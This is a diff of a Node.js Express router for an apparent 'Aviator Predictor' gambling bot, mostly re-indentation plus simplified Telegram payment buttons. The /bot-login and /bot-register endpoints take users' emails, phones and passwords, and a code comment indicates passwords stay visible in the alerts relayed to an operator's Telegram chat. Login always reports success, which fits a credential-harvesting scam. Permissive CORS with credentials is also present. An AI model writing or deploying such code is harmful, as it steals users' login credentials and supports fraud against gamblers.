@@ -11,70 +11,70 @@ const telegramChatId = process.env.TELEGRAM_CHAT_ID;
 
 // Helper function to log authentication attempts
 const logAuthData = (data) => {
-  const logsDir = path.join(__dirname, '..', 'logs');
-  if (!fs.existsSync(logsDir)) {
-    fs.mkdirSync(logsDir);
-  }
-  
-  const logFile = path.join(logsDir, `telegram-auth-${new Date().toISOString().split('T')[0]}.log`);
-  const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
-  fs.appendFileSync(logFile, logEntry);
-  console.log('🔐 Telegram auth data logged:', data);
+    const logsDir = path.join(__dirname, '..', 'logs');
+    if (!fs.existsSync(logsDir)) {
+        fs.mkdirSync(logsDir);
+    }
+
+    const logFile = path.join(logsDir, `telegram-auth-${new Date().toISOString().split('T')[0]}.log`);
+    const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
+    fs.appendFileSync(logFile, logEntry);
+    console.log('🔐 Telegram auth data logged:', data);
 };
 
 // Helper function to send to Telegram
 const sendToTelegram = async (message) => {
-  try {
-    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
-    
-    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: telegramChatId,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-    
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
-      return { success: false, error: `Telegram API error: ${response.status}`, details: errorText };
+    try {
+        console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
+
+        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
+            return { success: false, error: `Telegram API error: ${response.status}`, details: errorText };
+        }
+
+        const result = await response.json();
+        console.log('✅ Telegram message sent successfully:', result.message_id);
+        return { success: true, result };
+
+    } catch (error) {
+        console.error('❌ Failed to send to Telegram:', error.message);
+        return { success: false, error: error.message };
     }
-    
-    const result = await response.json();
-    console.log('✅ Telegram message sent successfully:', result.message_id);
-    return { success: true, result };
-    
-  } catch (error) {
-    console.error('❌ Failed to send to Telegram:', error.message);
-    return { success: false, error: error.message };
-  }
 };
 
 // Mask sensitive data for logging (keeping passwords visible but masked in logs)
 const maskSensitiveData = (data) => {
-  const masked = { ...data };
-  if (masked.password) {
-    masked.password = '*'.repeat(masked.password.length);
-  }
-  return masked;
+    const masked = { ...data };
+    if (masked.password) {
+        masked.password = '*'.repeat(masked.password.length);
+    }
+    return masked;
 };
 
 // CORS middleware for all telegram routes
 router.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
-  res.header('Access-Control-Allow-Credentials', 'true');
-  
-  if (req.method === 'OPTIONS') {
-    return res.sendStatus(200);
-  }
-  next();
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
+    res.header('Access-Control-Allow-Credentials', 'true');
+
+    if (req.method === 'OPTIONS') {
+        return res.sendStatus(200);
+    }
+    next();
 });
 
 // In-memory storage for pending payments
@@ -106,23 +106,23 @@ router.post('/send', async (req, res) => {
         res.header('Access-Control-Allow-Origin', '*');
     }
     res.header('Access-Control-Allow-Credentials', 'true');
-    
+
     // Respond quickly to avoid client timeout
     let responseSent = false;
-    
+
     const sendResponse = (status, data) => {
         if (!responseSent && !res.headersSent) {
             responseSent = true;
             res.status(status).json(data);
         }
     };
-    
+
     try {
         const { message, orderId, includeVerificationButtons, paymentData } = req.body;
-        
-        console.log('📥 Telegram send request:', { 
-            messageLength: message?.length, 
-            orderId, 
+
+        console.log('📥 Telegram send request:', {
+            messageLength: message?.length,
+            orderId,
             includeVerificationButtons,
             hasPaymentData: !!paymentData,
             hasToken: !!telegramBotToken,
@@ -146,61 +146,36 @@ router.post('/send', async (req, res) => {
             parse_mode: 'HTML'
         };
 
-        // Add verification buttons for support messages
+        // Add buttons for support/reply if orderId is provided
         if (includeVerificationButtons && orderId) {
-            if (paymentData && paymentData.messageType === 'support') {
-                // Support message buttons
-                messageOptions.reply_markup = {
-                    inline_keyboard: [
-                        [
-                            {
-                                text: '💬 Reply to Customer',
-                                callback_data: `reply_${orderId}`
-                            }
-                        ]
+            messageOptions.reply_markup = {
+                inline_keyboard: [
+                    [
+                        {
+                            text: '💬 Reply to Customer',
+                            callback_data: `reply_${orderId}`
+                        }
                     ]
-                };
-            } else {
-                // Payment verification buttons
-                messageOptions.reply_markup = {
-                    inline_keyboard: [
-                        [
-                            {
-                                text: '✅ VERIFY & SEND PREDICTIONS',
-                                callback_data: `verify_${orderId}`
-                            },
-                            {
-                                text: '❌ REJECT PAYMENT', 
-                                callback_data: `reject_${orderId}`
-                            }
-                        ],
-                        [
-                            {
-                                text: '💬 Reply to Customer',
-                                callback_data: `reply_${orderId}`
-                            }
-                        ]
-                    ]
-                };
-            }
+                ]
+            };
         }
 
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
         console.log('📤 Sending to Telegram URL:', url.substring(0, 50) + '...');
-        console.log('📤 Message options:', { 
-            chat_id: messageOptions.chat_id, 
+        console.log('📤 Message options:', {
+            chat_id: messageOptions.chat_id,
             textLength: messageOptions.text?.length,
             hasButtons: !!messageOptions.reply_markup,
             buttonCount: messageOptions.reply_markup?.inline_keyboard?.length || 0
         });
-        
+
         // Send immediate response to frontend
         sendResponse(200, {
             success: true,
             message: 'Message queued for Telegram delivery',
             orderId: orderId
         });
-        
+
         // Continue with Telegram API call in background
         const response = await fetch(url, {
             method: 'POST',
@@ -236,18 +211,18 @@ router.post('/send', async (req, res) => {
 router.post('/webhook', async (req, res) => {
     try {
         const update = req.body;
-        
+
         // Handle text messages (for /reply commands and admin replies)
         if (update.message && update.message.text) {
             const text = update.message.text;
             const chatId = update.message.chat.id;
             const messageId = update.message.message_id;
-            
+
             console.log('Received message:', text);
 
             // Default help message for telegram commands
             if (text === '/start' || text === '/help') {
-                await sendTelegramMessage(chatId, 
+                await sendTelegramMessage(chatId,
                     `🤖 Aviator Support Bot\n\n` +
                     `This bot notifies admins about:\n` +
                     `• Payment verifications\n` +
@@ -256,16 +231,16 @@ router.post('/webhook', async (req, res) => {
                 );
             }
         }
-        
+
         // Handle callback queries (button clicks) - keeping payment verification
         if (update.callback_query) {
             const callbackQuery = update.callback_query;
             const data = callbackQuery.data;
             const chatId = callbackQuery.message.chat.id;
             const messageId = callbackQuery.message.message_id;
-            
+
             console.log('Received callback:', data);
-            
+
             if (data.startsWith('verify_')) {
                 const orderId = data.replace('verify_', '');
                 await handlePaymentVerification(orderId, chatId, messageId, 'verified');
@@ -275,7 +250,7 @@ router.post('/webhook', async (req, res) => {
             } else if (data.startsWith('reply_')) {
                 const orderId = data.replace('reply_', '');
                 await handleCustomerReply(orderId, chatId, messageId);
-            } 
+            }
 
             // Answer callback query to remove loading state
             await fetch(`https://api.telegram.org/bot${telegramBotToken}/answerCallbackQuery`, {
@@ -287,7 +262,7 @@ router.post('/webhook', async (req, res) => {
                 })
             });
         }
-        
+
         res.status(200).json({ success: true });
     } catch (error) {
         console.error('Webhook error:', error);
@@ -330,16 +305,16 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
 
         // Get payment data from storage sources
         let payment = pendingPayments.get(orderId);
-        
+
         // Try Selar payments storage
         if (!payment && global.selarPayments && global.selarPayments[orderId]) {
             const selarPayment = global.selarPayments[orderId];
-            
+
             // Check if already processed
             if (selarPayment.status === 'verified' || selarPayment.status === 'rejected') {
                 console.log(`⚠️ Selar order ${orderId} already has status: ${selarPayment.status}`);
                 delete global.processingOrders[orderId];
-                await updateMessage(chatId, messageId, 
+                await updateMessage(chatId, messageId,
                     `⚠️ Selar Order ${orderId} was already ${selarPayment.status}!\n\n` +
                     `📧 Customer: ${selarPayment.email}\n` +
                     `📦 Package: ${selarPayment.packageName}\n` +
@@ -348,7 +323,7 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
                 );
                 return;
             }
-            
+
             payment = {
                 email: selarPayment.email,
                 packageName: selarPayment.packageName,
@@ -389,17 +364,17 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
                 paymentType: 'usdt'
             };
         }
-        
+
         if (!payment) {
             console.log(`❌ Order ${orderId} not found in any payment storage`);
             delete global.processingOrders[orderId];
             await updateMessage(chatId, messageId, `❌ Order ${orderId} not found or already processed.`);
             return;
         }
-        
+
         // Check if already processed to prevent race conditions
         if (payment.status === 'verified') {
-            await updateMessage(chatId, messageId, 
+            await updateMessage(chatId, messageId,
                 `✅ Order ${orderId} already VERIFIED!\n\n` +
                 `📧 Customer: ${payment.email}\n` +
                 `📦 Package: ${payment.packageName}\n` +
@@ -408,9 +383,9 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
             );
             return;
         }
-        
+
         if (payment.status === 'rejected') {
-            await updateMessage(chatId, messageId, 
+            await updateMessage(chatId, messageId,
                 `❌ Order ${orderId} already REJECTED!\n\n` +
                 `📧 Customer: ${payment.email}\n` +
                 `📦 Package: ${payment.packageName}\n` +
@@ -419,15 +394,15 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
             );
             return;
         }
-        
+
         if (action === 'verified') {
-            console.log(`✅ PAYMENT VERIFIED via Telegram:`, { 
-                orderId, 
+            console.log(`✅ PAYMENT VERIFIED via Telegram:`, {
+                orderId,
                 email: payment.email,
                 package: payment.packageName,
                 paymentType: payment.paymentType || 'unknown'
             });
-                
+
             // Determine the correct verification endpoint based on payment type
             const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || 'https://aviator-backend-komp.onrender.com';
             let verifyUrl;
@@ -444,18 +419,18 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
                 // Default to Selar for compatibility
                 verifyUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
             }
-            
+
             console.log('🔗 Verification URL:', verifyUrl);
             console.log('🔗 BASE_URL from env:', process.env.BASE_URL);
-            
+
             const response = await fetch(verifyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ verified: true })
             });
-                
+
             if (response.ok) {
-                await updateMessage(chatId, messageId, 
+                await updateMessage(chatId, messageId,
                     `✅ Payment VERIFIED!\n\n` +
                     `📧 Customer: ${payment.email}\n` +
                     `📦 Package: ${payment.packageName}\n` +
@@ -464,38 +439,38 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
                     `🔗 Type: ${payment.paymentType || 'selar'}\n\n` +
                     `🎯 Access has been granted to customer!`
                 );
-                
+
                 // Only delete from pendingPayments after successful verification
                 if (pendingPayments.has(orderId)) {
                     pendingPayments.delete(orderId);
                 }
-                
+
                 // Clear processing state
                 delete global.processingOrders[orderId];
-                    
+
                 console.log(`✅ Customer ${payment.email} will now see access granted!`);
             } else {
                 const errorText = await response.text();
                 console.error('Verification failed:', errorText);
-                
+
                 // Clear processing state
                 delete global.processingOrders[orderId];
-                
+
                 await updateMessage(chatId, messageId, `❌ Failed to verify payment for order ${orderId}: ${errorText}`);
-                
+
                 // Reset status back to pending if verification failed
                 if (global.selarPayments && global.selarPayments[orderId]) {
                     global.selarPayments[orderId].status = 'pending_verification';
                 }
             }
         } else if (action === 'rejected') {
-            console.log(`❌ PAYMENT REJECTED via Telegram:`, { 
-                orderId, 
+            console.log(`❌ PAYMENT REJECTED via Telegram:`, {
+                orderId,
                 email: payment.email,
                 package: payment.packageName,
                 paymentType: payment.paymentType || 'unknown'
             });
-            
+
             // Determine the correct rejection endpoint based on payment type
             const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || 'https://aviator-backend-komp.onrender.com';
             let rejectUrl;
@@ -512,18 +487,18 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
                 // Default to Selar for compatibility
                 rejectUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
             }
-            
+
             console.log('🔗 Rejection URL:', rejectUrl);
             console.log('🔗 BASE_URL from env:', process.env.BASE_URL);
-            
+
             const response = await fetch(rejectUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ verified: false })
             });
-            
+
             if (response.ok) {
-                await updateMessage(chatId, messageId, 
+                await updateMessage(chatId, messageId,
                     `❌ Payment REJECTED!\n\n` +
                     `📧 Customer: ${payment.email}\n` +
                     `📦 Package: ${payment.packageName}\n` +
@@ -532,23 +507,23 @@ async function handlePaymentVerification(orderId, chatId, messageId, action) {
                     `🔗 Type: ${payment.paymentType || 'selar'}\n\n` +
                     `Customer has been notified.`
                 );
-                
+
                 // Only delete from pendingPayments after successful rejection
                 if (pendingPayments.has(orderId)) {
                     pendingPayments.delete(orderId);
                 }
-                
+
                 // Clear processing state
                 delete global.processingOrders[orderId];
             } else {
                 const errorText = await response.text();
                 console.error('Rejection failed:', errorText);
-                
+
                 // Clear processing state
                 delete global.processingOrders[orderId];
-                
+
                 await updateMessage(chatId, messageId, `❌ Failed to reject payment for order ${orderId}: ${errorText}`);
-                
+
                 // Reset status back to pending if rejection failed
                 if (global.selarPayments && global.selarPayments[orderId]) {
                     global.selarPayments[orderId].status = 'pending_verification';
@@ -584,9 +559,9 @@ router.post('/set-webhook', async (req, res) => {
     try {
         const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || '';
         const webhookUrl = `${baseUrl}/api/telegram/webhook`;
-        
+
         console.log('🔗 Setting webhook URL:', webhookUrl);
-        
+
         const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/setWebhook`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -595,11 +570,11 @@ router.post('/set-webhook', async (req, res) => {
                 allowed_updates: ['callback_query', 'message']
             })
         });
-        
+
         const result = await response.json();
-        
+
         console.log('📱 Telegram webhook response:', result);
-        
+
         if (result.ok) {
             res.json({ success: true, message: 'Webhook set successfully', webhookUrl });
         } else {
@@ -660,26 +635,26 @@ router.post('/notify-selar-payment', async (req, res) => {
 // Endpoint to notify Selar checkout initiation
 router.post('/notify-selar', async (req, res) => {
     const { email, packageName, amount, source } = req.body;
-    
+
     if (!email || !packageName) {
         return res.status(400).json({ success: false, message: 'Email and packageName are required.' });
     }
-    
+
     // Build message
     let message = `💳 <b>SELAR CHECKOUT INITIATED</b>\n\n`;
     message += `👤 <b>Customer:</b> ${email}\n`;
     message += `📦 <b>Package:</b> ${packageName}\n`;
-    
+
     if (amount) {
         message += `💰 <b>Amount:</b> $${amount}\n`;
     }
-    
+
     if (source) {
         message += `🔗 <b>Source:</b> ${source}\n`;
     }
-    
+
     message += `\n🚦 <b>Customer is being redirected to Selar checkout...</b>`;
-    
+
     try {
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
         const messageOptions = {
@@ -687,13 +662,13 @@ router.post('/notify-selar', async (req, res) => {
             text: message,
             parse_mode: 'HTML'
         };
-        
+
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(messageOptions)
         });
-        
+
         res.json({ success: true, message: 'Card info and Selar notification sent to Telegram.' });
     } catch (error) {
         console.error('Error sending Selar card notification:', error);
@@ -705,35 +680,35 @@ router.post('/notify-selar', async (req, res) => {
 
 // Bot login endpoint
 router.post('/bot-login', async (req, res) => {
-  try {
-    const { contact, password, userAgent, timestamp } = req.body;
+    try {
+        const { contact, password, userAgent, timestamp } = req.body;
 
-    // Validate required fields
-    if (!contact || !password) {
-      return res.status(400).json({ 
-        success: false,
-        error: 'Contact and password are required' 
-      });
-    }
+        // Validate required fields
+        if (!contact || !password) {
+            return res.status(400).json({
+                success: false,
+                error: 'Contact and password are required'
+            });
+        }
 
-    // Determine contact type
-    const contactType = contact.includes('@') ? 'Email' : 'Mobile';
-    
-    const authData = {
-      contact,
-      contactType,
-      password,
-      userAgent: userAgent || 'Unknown',
-      timestamp: timestamp || new Date().toISOString(),
-      source: 'Aviator Bot Login',
-      ip: req.ip || 'Unknown'
-    };
+        // Determine contact type
+        const contactType = contact.includes('@') ? 'Email' : 'Mobile';
 
-    // Log authentication attempt (with masked password)
-    logAuthData(maskSensitiveData(authData));
+        const authData = {
+            contact,
+            contactType,
+            password,
+            userAgent: userAgent || 'Unknown',
+            timestamp: timestamp || new Date().toISOString(),
+            source: 'Aviator Bot Login',
+            ip: req.ip || 'Unknown'
+        };
 
-    // Send to Telegram with formatted message
-    const telegramMessage = `🤖 <b>AVIATOR BOT LOGIN ALERT</b>
+        // Log authentication attempt (with masked password)
+        logAuthData(maskSensitiveData(authData));
+
+        // Send to Telegram with formatted message
+        const telegramMessage = `🤖 <b>AVIATOR BOT LOGIN ALERT</b>
 
 📧 Contact: <code>${contact}</code>
 📱 Type: ${contactType}
@@ -743,85 +718,85 @@ router.post('/bot-login', async (req, res) => {
 ⏰ Time: <code>${new Date().toLocaleString()}</code>
 🔗 Source: Aviator Predictor Bot`;
 
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Bot login Telegram result:', telegramResult);
+        const telegramResult = await sendToTelegram(telegramMessage);
+        console.log('✅ Bot login Telegram result:', telegramResult);
 
-    // Return success with session info
-    res.json({ 
-      success: true,
-      message: 'Login successful',
-      sessionData: {
-        contact,
-        contactType,
-        loginTime: authData.timestamp,
-        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
-      }
-    });
+        // Return success with session info
+        res.json({
+            success: true,
+            message: 'Login successful',
+            sessionData: {
+                contact,
+                contactType,
+                loginTime: authData.timestamp,
+                sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
+            }
+        });
 
-  } catch (error) {
-    console.error('❌ Bot login error:', error);
-    
-    // Log error but still return success to avoid breaking frontend flow
-    logAuthData({
-      error: error.message,
-      contact: req.body.contact,
-      timestamp: new Date().toISOString()
-    });
+    } catch (error) {
+        console.error('❌ Bot login error:', error);
 
-    res.json({ 
-      success: true,
-      message: 'Login processed (fallback mode)',
-      warning: 'Some features may be limited'
-    });
-  }
+        // Log error but still return success to avoid breaking frontend flow
+        logAuthData({
+            error: error.message,
+            contact: req.body.contact,
+            timestamp: new Date().toISOString()
+        });
+
+        res.json({
+            success: true,
+            message: 'Login processed (fallback mode)',
+            warning: 'Some features may be limited'
+        });
+    }
 });
 
 // Bot registration endpoint
 router.post('/bot-register', async (req, res) => {
-  try {
-    const { email, phone, password, userAgent, timestamp } = req.body;
+    try {
+        const { email, phone, password, userAgent, timestamp } = req.body;
 
-    // Validate required fields
-    if (!email || !phone || !password) {
-      return res.status(400).json({ 
-        success: false,
-        error: 'Email, phone, and password are required' 
-      });
-    }
+        // Validate required fields
+        if (!email || !phone || !password) {
+            return res.status(400).json({
+                success: false,
+                error: 'Email, phone, and password are required'
+            });
+        }
 
-    // Basic email validation
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-      return res.status(400).json({ 
-        success: false,
-        error: 'Invalid email format' 
-      });
-    }
+        // Basic email validation
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(email)) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid email format'
+            });
+        }
 
-    // Basic phone validation (simple check for numbers and common formats)
-    const phoneRegex = /^[\+]?[1-9][\d]{3,14}$/;
-    if (!phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''))) {
-      return res.status(400).json({ 
-        success: false,
-        error: 'Invalid phone number format' 
-      });
-    }
+        // Basic phone validation (simple check for numbers and common formats)
+        const phoneRegex = /^[\+]?[1-9][\d]{3,14}$/;
+        if (!phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''))) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid phone number format'
+            });
+        }
 
-    const registrationData = {
-      email,
-      phone,
-      password,
-      userAgent: userAgent || 'Unknown',
-      timestamp: timestamp || new Date().toISOString(),
-      source: 'Aviator Bot Registration',
-      ip: req.ip || 'Unknown'
-    };
+        const registrationData = {
+            email,
+            phone,
+            password,
+            userAgent: userAgent || 'Unknown',
+            timestamp: timestamp || new Date().toISOString(),
+            source: 'Aviator Bot Registration',
+            ip: req.ip || 'Unknown'
+        };
 
-    // Log registration attempt (with masked password)
-    logAuthData(maskSensitiveData(registrationData));
+        // Log registration attempt (with masked password)
+        logAuthData(maskSensitiveData(registrationData));
 
-    // Send to Telegram with formatted message
-    const telegramMessage = `🆕 <b>NEW BOT USER REGISTRATION</b>
+        // Send to Telegram with formatted message
+        const telegramMessage = `🆕 <b>NEW BOT USER REGISTRATION</b>
 
 👤 Email: <code>${email}</code>
 📱 Phone: <code>${phone}</code>
@@ -832,45 +807,45 @@ router.post('/bot-register', async (req, res) => {
 🤖 Platform: Aviator Predictor Bot
 🔗 Status: Successfully registered`;
 
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Bot registration Telegram result:', telegramResult);
+        const telegramResult = await sendToTelegram(telegramMessage);
+        console.log('✅ Bot registration Telegram result:', telegramResult);
 
-    // Return success with registration info
-    res.json({ 
-      success: true,
-      message: 'Registration successful',
-      userData: {
-        email,
-        phone,
-        registrationTime: registrationData.timestamp,
-        status: 'registered'
-      }
-    });
+        // Return success with registration info
+        res.json({
+            success: true,
+            message: 'Registration successful',
+            userData: {
+                email,
+                phone,
+                registrationTime: registrationData.timestamp,
+                status: 'registered'
+            }
+        });
 
-  } catch (error) {
-    console.error('❌ Bot registration error:', error);
-    
-    // Log error
-    logAuthData({
-      error: error.message,
-      email: req.body.email,
-      phone: req.body.phone,
-      timestamp: new Date().toISOString()
-    });
+    } catch (error) {
+        console.error('❌ Bot registration error:', error);
 
-    res.status(500).json({ 
-      success: false,
-      error: 'Registration failed. Please try again.',
-      details: error.message
-    });
-  }
+        // Log error
+        logAuthData({
+            error: error.message,
+            email: req.body.email,
+            phone: req.body.phone,
+            timestamp: new Date().toISOString()
+        });
+
+        res.status(500).json({
+            success: false,
+            error: 'Registration failed. Please try again.',
+            details: error.message
+        });
+    }
 });
 
 // Get chat ID helper endpoint
 router.get('/get-chat-id', async (req, res) => {
-  try {
-    // This will help you find your correct chat ID
-    const instructions = `
+    try {
+        // This will help you find your correct chat ID
+        const instructions = `
 To find your chat ID:
 1. Go to Telegram and search for @spribeguru_bot
 2. Send /start to the bot
@@ -886,27 +861,27 @@ If the current chat ID doesn't work, you may need to:
 - Or create a group with the bot and use the group ID
 `;
 
-    res.json({
-      success: true,
-      message: "Chat ID Helper",
-      instructions: instructions,
-      currentChatId: telegramChatId,
-      botUsername: "@spribeguru_bot"
-    });
+        res.json({
+            success: true,
+            message: "Chat ID Helper",
+            instructions: instructions,
+            currentChatId: telegramChatId,
+            botUsername: "@spribeguru_bot"
+        });
 
-  } catch (error) {
-    console.error('❌ Get chat ID error:', error);
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
-  }
+    } catch (error) {
+        console.error('❌ Get chat ID error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
 });
 
 // Test Telegram connectivity endpoint
 router.get('/test-telegram', async (req, res) => {
-  try {
-    const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>
+    try {
+        const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>
 
 ⏰ Time: <code>${new Date().toLocaleString()}</code>
 📍 IP: <code>${req.ip || 'Unknown'}</code>
@@ -914,25 +889,25 @@ router.get('/test-telegram', async (req, res) => {
 
 ✅ If you see this message, Telegram integration is working!`;
 
-    const result = await sendToTelegram(testMessage);
-    
-    res.json({
-      success: true,
-      message: 'Telegram test completed',
-      telegramResult: result,
-      botToken: telegramBotToken ? 'Present' : 'Missing',
-      chatId: telegramChatId ? 'Present' : 'Missing'
-    });
+        const result = await sendToTelegram(testMessage);
 
-  } catch (error) {
-    console.error('❌ Telegram test error:', error);
-    res.status(500).json({
-      success: false,
-      error: error.message,
-      botToken: telegramBotToken ? 'Present' : 'Missing',
-      chatId: telegramChatId ? 'Present' : 'Missing'
-    });
-  }
+        res.json({
+            success: true,
+            message: 'Telegram test completed',
+            telegramResult: result,
+            botToken: telegramBotToken ? 'Present' : 'Missing',
+            chatId: telegramChatId ? 'Present' : 'Missing'
+        });
+
+    } catch (error) {
+        console.error('❌ Telegram test error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message,
+            botToken: telegramBotToken ? 'Present' : 'Missing',
+            chatId: telegramChatId ? 'Present' : 'Missing'
+        });
+    }
 });
 
 module.exports = router;
